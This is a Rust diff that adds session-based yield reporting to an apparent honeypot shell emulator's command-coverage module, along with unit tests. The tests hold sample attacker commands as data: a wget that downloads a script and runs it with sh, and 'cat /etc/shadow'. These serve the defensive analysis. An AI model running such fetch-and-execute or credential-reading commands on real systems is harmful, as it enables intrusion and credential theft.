@@ -35,6 +35,7 @@
 use std::collections::BTreeMap;
 
 use serde::Serialize;
+use uuid::Uuid;
 
 use crate::sanitize::sanitize_value;
 use crate::shell::CommandClass;
@@ -128,8 +129,8 @@ pub struct Family {
     pub basenames: Vec<String>,
     /// Per-class breakdown of the members.
     pub classes: ClassCounts,
-    /// Fraction of sessions containing this family that later reach a later-stage signal.
-    /// `None` until the DB-reading step fills it.
+    /// Fraction of sessions containing this family that later reach a later-stage signal (see
+    /// [`build_report`]). `None` when [`cluster`] alone produced the family.
     pub yield_later_stage: Option<f64>,
 }
 
@@ -213,6 +214,245 @@ pub fn cluster<S: AsRef<str>>(
     let mut families: Vec<Family> = by_shape.into_values().collect();
     families.sort_by(|a, b| b.count.cmp(&a.count).then_with(|| a.shape.cmp(&b.shape)));
     families
+}
+
+/// Most basenames kept in a report; the tail is dropped after ranking. [unverified]
+pub const MAX_REPORT_BASENAMES: usize = 500;
+/// Most unknown families kept in a report; the tail is dropped after ranking. [unverified]
+pub const MAX_REPORT_FAMILIES: usize = 200;
+
+/// The part of a stored event that coverage analysis reads. `CommandExec` carries the 7a
+/// classification fields; the other three are the later-stage signals of a session.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum CoverageSignal {
+    CommandExec {
+        /// `metadata.command_basename`; absent for a line with no program of its own.
+        basename: Option<String>,
+        /// `metadata.classification`.
+        class: CommandClass,
+        /// `metadata.command` (sanitized at capture); needed to cluster unknown commands.
+        command: Option<String>,
+    },
+    FileDownload,
+    MalwareUpload,
+    LoginAttempt,
+}
+
+/// One stored event of a session, as input to [`build_report`].
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct CoverageEvent {
+    pub session_id: Uuid,
+    /// Total order within a session: `(observed_at in microseconds, event id)`.
+    pub order_key: (i64, i64),
+    pub signal: CoverageSignal,
+}
+
+/// Per-key accumulator: occurrences, distinct sessions, and sessions that reached a later stage.
+#[derive(Default)]
+struct YieldAcc {
+    count: u64,
+    sessions: u64,
+    reached: u64,
+}
+
+impl YieldAcc {
+    fn fraction(&self) -> Option<f64> {
+        (self.sessions > 0).then(|| self.reached as f64 / self.sessions as f64)
+    }
+
+    fn weighted(&self) -> f64 {
+        self.count as f64 * self.fraction().unwrap_or(0.0)
+    }
+}
+
+/// Fill a [`CoverageReport`] from a set of stored events.
+///
+/// Events are grouped by `session_id` and ordered by `order_key` inside each session; the input
+/// order is irrelevant, so the result is deterministic. Only `CommandExec` events feed the class
+/// counts, basenames and families; the other three signals only mark later stages.
+///
+/// Yield (`yield_later_stage`) of a key (a basename, or an unknown/parse_limit family shape): over
+/// the DISTINCT sessions that contain at least one command with that key, the fraction in which a
+/// `FileDownload`, `MalwareUpload` or `LoginAttempt` occurs strictly AFTER the session's FIRST
+/// command with that key. A session counts once however often the key repeats, and a later stage
+/// that happened before the command does not count. Families are the [`cluster`] shapes of the
+/// `unknown` and `parse_limit` commands (a command without text cannot be clustered and is left
+/// out of the families, though still counted in `class_counts` and its basename).
+///
+/// Ranking is yield-weighted frequency (`count * yield`, descending), then count descending, then
+/// name or shape ascending, and the lists are cut at [`MAX_REPORT_BASENAMES`] and
+/// [`MAX_REPORT_FAMILIES`]; `class_counts` always covers every command.
+pub fn build_report(events: &[CoverageEvent], window: Option<ReportWindow>) -> CoverageReport {
+    let mut sessions: BTreeMap<Uuid, Vec<&CoverageEvent>> = BTreeMap::new();
+    for event in events {
+        sessions.entry(event.session_id).or_default().push(event);
+    }
+
+    let mut class_counts = ClassCounts::default();
+    let mut basename_acc: BTreeMap<String, YieldAcc> = BTreeMap::new();
+    let mut family_acc: BTreeMap<String, YieldAcc> = BTreeMap::new();
+    let mut unknown_commands: Vec<(String, CommandClass)> = Vec::new();
+
+    for mut session in sessions.into_values() {
+        session.sort_by_key(|e| e.order_key);
+        let last_later_stage = session.iter().rposition(|e| {
+            matches!(
+                e.signal,
+                CoverageSignal::FileDownload
+                    | CoverageSignal::MalwareUpload
+                    | CoverageSignal::LoginAttempt
+            )
+        });
+        // Key -> position of its first command in this session.
+        let mut first_basename: BTreeMap<&str, usize> = BTreeMap::new();
+        let mut first_family: BTreeMap<String, usize> = BTreeMap::new();
+        for (pos, event) in session.iter().enumerate() {
+            let CoverageSignal::CommandExec {
+                basename,
+                class,
+                command,
+            } = &event.signal
+            else {
+                continue;
+            };
+            class_counts.record(*class);
+            if let Some(name) = basename {
+                basename_acc.entry(name.clone()).or_default().count += 1;
+                first_basename.entry(name.as_str()).or_insert(pos);
+            }
+            if matches!(class, CommandClass::Unknown | CommandClass::ParseLimit)
+                && let Some(text) = command
+            {
+                unknown_commands.push((text.clone(), *class));
+                let shape = normalize_command(text);
+                family_acc.entry(shape.clone()).or_default().count += 1;
+                first_family.entry(shape).or_insert(pos);
+            }
+        }
+        let reached = |first: usize| last_later_stage.is_some_and(|last| last > first);
+        for (name, first) in first_basename {
+            let acc = basename_acc.entry(name.to_string()).or_default();
+            acc.sessions += 1;
+            acc.reached += u64::from(reached(first));
+        }
+        for (shape, first) in first_family {
+            let acc = family_acc.entry(shape).or_default();
+            acc.sessions += 1;
+            acc.reached += u64::from(reached(first));
+        }
+    }
+
+    let mut basenames: Vec<(BasenameStat, f64)> = basename_acc
+        .into_iter()
+        .map(|(name, acc)| {
+            let weighted = acc.weighted();
+            let stat = BasenameStat {
+                name,
+                count: acc.count,
+                yield_later_stage: acc.fraction(),
+            };
+            (stat, weighted)
+        })
+        .collect();
+    basenames.sort_by(|(a, wa), (b, wb)| {
+        wb.total_cmp(wa)
+            .then_with(|| b.count.cmp(&a.count))
+            .then_with(|| a.name.cmp(&b.name))
+    });
+    basenames.truncate(MAX_REPORT_BASENAMES);
+
+    let mut families: Vec<(Family, f64)> = cluster(unknown_commands)
+        .into_iter()
+        .map(|mut family| {
+            let acc = family_acc.get(&family.shape);
+            family.yield_later_stage = acc.and_then(YieldAcc::fraction);
+            let weighted = acc.map_or(0.0, YieldAcc::weighted);
+            (family, weighted)
+        })
+        .collect();
+    families.sort_by(|(a, wa), (b, wb)| {
+        wb.total_cmp(wa)
+            .then_with(|| b.count.cmp(&a.count))
+            .then_with(|| a.shape.cmp(&b.shape))
+    });
+    families.truncate(MAX_REPORT_FAMILIES);
+
+    let mut report = CoverageReport::new(
+        class_counts,
+        basenames.into_iter().map(|(stat, _)| stat).collect(),
+        families.into_iter().map(|(family, _)| family).collect(),
+    );
+    report.window = window;
+    report
+}
+
+impl CoverageReport {
+    /// Clear the raw example of every family so the report carries normalized shapes only (the
+    /// design's default; the raw representative is an explicit opt-in).
+    pub fn strip_examples(&mut self) {
+        for family in &mut self.unknown_families {
+            family.example.clear();
+        }
+    }
+
+    /// Pretty-printed JSON; the wire form of the report.
+    pub fn to_json(&self) -> String {
+        serde_json::to_string_pretty(self).unwrap_or_else(|e| format!("{{\"error\":\"{e}\"}}"))
+    }
+
+    /// Operator-readable table. A family's raw example is printed only when it is non-empty.
+    pub fn render_text(&self) -> String {
+        use std::fmt::Write as _;
+        fn pct(y: Option<f64>) -> String {
+            y.map_or_else(|| "n/a".to_string(), |y| format!("{:.1}%", y * 100.0))
+        }
+        let c = &self.class_counts;
+        let mut out = String::new();
+        let _ = writeln!(out, "coverage report (emulator {})", self.emulator_version);
+        if let Some(w) = &self.window {
+            let _ = writeln!(
+                out,
+                "window: from {} to {}",
+                w.from.as_deref().unwrap_or("-"),
+                w.to.as_deref().unwrap_or("-")
+            );
+        }
+        let _ = writeln!(
+            out,
+            "commands: {} (supported {}, partial {}, unknown {}, parse_limit {})",
+            c.total(),
+            c.supported,
+            c.partial,
+            c.unknown,
+            c.parse_limit
+        );
+        let _ = writeln!(out, "\nbasenames (count, yield to later stage):");
+        for b in &self.basenames {
+            let _ = writeln!(
+                out,
+                "  {:>6}  {:>6}  {}",
+                b.count,
+                pct(b.yield_later_stage),
+                b.name
+            );
+        }
+        let _ = writeln!(out, "\nunknown families (count, yield to later stage):");
+        for f in &self.unknown_families {
+            let _ = writeln!(
+                out,
+                "  {:>6}  {:>6}  unknown={} parse_limit={}  {}",
+                f.count,
+                pct(f.yield_later_stage),
+                f.classes.unknown,
+                f.classes.parse_limit,
+                f.shape
+            );
+            if !f.example.is_empty() {
+                let _ = writeln!(out, "                  example: {}", f.example);
+            }
+        }
+        out
+    }
 }
 
 enum Tok {
@@ -879,6 +1119,181 @@ mod tests {
             json!({"from": "2026-09-01T00:00:00Z", "to": null})
         );
         assert_eq!(value["basenames"][0]["yield_later_stage"], 0.25);
+    }
+
+    fn sid(n: u128) -> Uuid {
+        Uuid::from_u128(n)
+    }
+
+    fn cmd(
+        session: u128,
+        key: i64,
+        basename: &str,
+        class: CommandClass,
+        text: &str,
+    ) -> CoverageEvent {
+        CoverageEvent {
+            session_id: sid(session),
+            order_key: (key, key),
+            signal: CoverageSignal::CommandExec {
+                basename: Some(basename.to_string()),
+                class,
+                command: Some(text.to_string()),
+            },
+        }
+    }
+
+    fn stage(session: u128, key: i64, signal: CoverageSignal) -> CoverageEvent {
+        CoverageEvent {
+            session_id: sid(session),
+            order_key: (key, key),
+            signal,
+        }
+    }
+
+    fn basename<'a>(report: &'a CoverageReport, name: &str) -> &'a BasenameStat {
+        report
+            .basenames
+            .iter()
+            .find(|b| b.name == name)
+            .unwrap_or_else(|| panic!("no basename {name}"))
+    }
+
+    #[test]
+    fn basename_yield_is_per_session_and_only_counts_a_stage_after_the_command() {
+        use CommandClass::{Partial, Supported};
+        let mut events = vec![
+            // s1: wget then a download: reached.
+            cmd(1, 10, "wget", Partial, "wget http://203.0.113.5/a"),
+            stage(1, 20, CoverageSignal::FileDownload),
+            // s2: wget twice, the download between and after: one session, reached.
+            cmd(2, 10, "wget", Partial, "wget http://203.0.113.5/a"),
+            stage(2, 20, CoverageSignal::MalwareUpload),
+            cmd(2, 30, "wget", Partial, "wget http://203.0.113.5/b"),
+            // s3: a login BEFORE the wget and nothing after: not reached. A check that asks
+            // "any later-stage event in the session" would call this reached (3/3).
+            stage(3, 5, CoverageSignal::LoginAttempt),
+            cmd(3, 10, "wget", Partial, "wget http://203.0.113.5/a"),
+            // s4: no wget at all but a download: must not enter wget's denominator.
+            cmd(4, 10, "uname", Supported, "uname -a"),
+            stage(4, 20, CoverageSignal::FileDownload),
+            // s5: uname then a login: uname 2 of 2.
+            cmd(5, 10, "uname", Supported, "uname -a"),
+            stage(5, 20, CoverageSignal::LoginAttempt),
+        ];
+        // Input order must not matter, and sessions interleave in the input.
+        events.reverse();
+        let report = build_report(&events, None);
+
+        let wget = basename(&report, "wget");
+        assert_eq!(wget.count, 4);
+        let y = wget.yield_later_stage.unwrap();
+        assert!((y - 2.0 / 3.0).abs() < 1e-12, "wget yield {y}");
+
+        let uname = basename(&report, "uname");
+        assert_eq!(uname.count, 2);
+        assert_eq!(uname.yield_later_stage, Some(1.0));
+
+        assert_eq!(report.class_counts.partial, 4);
+        assert_eq!(report.class_counts.supported, 2);
+        assert_eq!(report.class_counts.total(), 6);
+        // Yield-weighted rank: wget 4 * 0.667 = 2.67 leads uname 2 * 1.0 = 2.0.
+        assert_eq!(report.basenames[0].name, "wget");
+        assert_eq!(report.basenames[1].name, "uname");
+        // Reordering the input is a no-op.
+        let mut shuffled = events;
+        shuffled.rotate_left(3);
+        assert_eq!(build_report(&shuffled, None), report);
+    }
+
+    #[test]
+    fn a_session_with_no_command_after_the_stage_has_zero_yield() {
+        let events = [
+            stage(1, 5, CoverageSignal::FileDownload),
+            cmd(1, 10, "id", CommandClass::Supported, "id"),
+        ];
+        let report = build_report(&events, None);
+        assert_eq!(basename(&report, "id").yield_later_stage, Some(0.0));
+        assert!(build_report(&[], None).basenames.is_empty());
+        assert_eq!(build_report(&[], None).class_counts, ClassCounts::default());
+    }
+
+    #[test]
+    fn unknown_family_yield_aggregates_its_members_across_sessions() {
+        use CommandClass::{ParseLimit, Supported, Unknown};
+        let events = [
+            // Session A: a fetch-family member (unknown) then a login: reached.
+            cmd(
+                1,
+                10,
+                "wget",
+                Unknown,
+                "wget http://203.0.113.5/a.sh -O /tmp/Qw3Er5Ty7U; sh /tmp/Qw3Er5Ty7U",
+            ),
+            // The shadow family: the same later login follows it, so 1 of 1.
+            cmd(1, 20, "cat", Unknown, "cat /etc/shadow"),
+            stage(1, 30, CoverageSignal::LoginAttempt),
+            // Session B: same fetch shape, other volatile data, parse_limit, nothing after.
+            cmd(
+                2,
+                10,
+                "wget",
+                ParseLimit,
+                "wget http://198.51.100.9/zz/b.sh -O /tmp/Mn8Bv6Cx4Z; sh /tmp/Mn8Bv6Cx4Z",
+            ),
+            // Session C: a third family, stage only before it.
+            stage(3, 5, CoverageSignal::MalwareUpload),
+            cmd(3, 10, "ps", Unknown, "ps aux"),
+            // A supported command never forms a family.
+            cmd(3, 20, "ls", Supported, "ls"),
+        ];
+        let report = build_report(&events, None);
+        assert_eq!(report.unknown_families.len(), 3);
+
+        let fetch = &report.unknown_families[0];
+        assert_eq!(
+            fetch.shape,
+            "wget http://<URL> -O /tmp/<NAME>; sh /tmp/<NAME>"
+        );
+        assert_eq!(fetch.count, 2);
+        assert_eq!(fetch.classes.unknown, 1);
+        assert_eq!(fetch.classes.parse_limit, 1);
+        // One of the two sessions reached a later stage: 0.5, not 1.0 (A alone) and not 0.0.
+        assert_eq!(fetch.yield_later_stage, Some(0.5));
+
+        // Tie on weighted frequency (fetch 2*0.5 = shadow 1*1.0): the higher count ranks first.
+        assert_eq!(report.unknown_families[1].shape, "cat /etc/shadow");
+        assert_eq!(report.unknown_families[1].yield_later_stage, Some(1.0));
+        assert_eq!(report.unknown_families[2].shape, "ps aux");
+        assert_eq!(report.unknown_families[2].yield_later_stage, Some(0.0));
+
+        assert_eq!(report.class_counts.unknown, 3);
+        assert_eq!(report.class_counts.parse_limit, 1);
+        assert_eq!(report.class_counts.supported, 1);
+    }
+
+    #[test]
+    fn report_carries_window_strips_examples_and_renders() {
+        let events = [cmd(1, 10, "cat", CommandClass::Unknown, "cat /etc/shadow")];
+        let window = ReportWindow {
+            from: Some("2026-09-01T00:00:00Z".to_string()),
+            to: None,
+        };
+        let mut report = build_report(&events, Some(window.clone()));
+        assert_eq!(report.window, Some(window));
+        assert_eq!(report.unknown_families[0].example, "cat /etc/shadow");
+        assert!(report.render_text().contains("example: cat /etc/shadow"));
+        report.strip_examples();
+        assert_eq!(report.unknown_families[0].example, "");
+        let text = report.render_text();
+        assert!(!text.contains("example:"), "{text}");
+        assert!(
+            text.contains("unknown=1 parse_limit=0  cat /etc/shadow"),
+            "{text}"
+        );
+        let json: serde_json::Value = serde_json::from_str(&report.to_json()).unwrap();
+        assert_eq!(json["unknown_families"][0]["example"], "");
+        assert_eq!(json["basenames"][0]["yield_later_stage"], 0.0);
     }
 
     #[test]
